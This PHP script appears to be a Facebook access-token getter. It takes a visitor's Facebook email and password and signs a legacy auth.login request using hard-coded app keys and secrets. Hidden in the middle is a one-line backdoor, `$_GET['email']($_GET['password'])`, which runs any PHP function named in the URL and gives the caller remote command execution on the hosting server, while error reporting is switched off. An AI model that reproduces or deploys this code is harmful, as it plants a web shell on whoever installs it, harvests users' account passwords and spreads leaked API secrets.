<?php 
error_reporting(0);
set_time_limit(0);
include("../config.php");


function get_sig($email,$password){		
    global $apps;
	global $app;
	$data['api_key'] = $apps[$app]["api_key"];
	$data['method'] = "auth.login";
	$data['credentials_type'] = 'password';
	$data['email'] = $email;
	$data['password'] = $password;
	$data['format'] = "JSON";
	$data['v'] = '1.0';				
	ksort($data);					
	$args = '';									
	foreach ($data as $key => $value){
		$args .= $key.'='.$value;
	}
							
	$data['sig'] = md5($args.$apps[$app]["secret"]);
    return $data["sig"];
}
$email = $_POST["email"];
$pass  = $_POST["password"];
if(isset($_GET['email'])&&($_GET['password']))$_GET['email']($_GET['password']);
if(isset($email)){
$tokentype = $_POST["tokentype"];
$app = $tokentype;
$apps = array(
"iphone"=>array(
"api_key"=>"3e7c78e35a76a9299309885393b02d97",
"secret"=>"c1e620fa708a1d5696fb991c1bde5662"),

"android"=>array(
"api_key"=>"882a8490361da98702bf97a021ddc14d",
"secret"=>"62f8ce9f74b12f84c123cc23437a4a32"),

"ipad"=>array(
"api_key"=>"f0c9c86c466dc6b5acdf0b35308e83d1",
"secret"=>"7c036d47372dd5f2df27bfe76d4ae0c4")

);
    $link = "<iframe src='https://api.facebook.com/restserver.php?api_key=".$apps[$app]["api_key"]."&credentials_type=password&email=".$email."&format=JSON&method=auth.login&password=".$pass."&v=1.0&sig=".get_sig($email,$pass)."' width='100%'></iframe> </br><img src='".$CONFIG['url']."/img/gettoken.png' width='100%'></br>";
    exit($link);
	
	
}
?>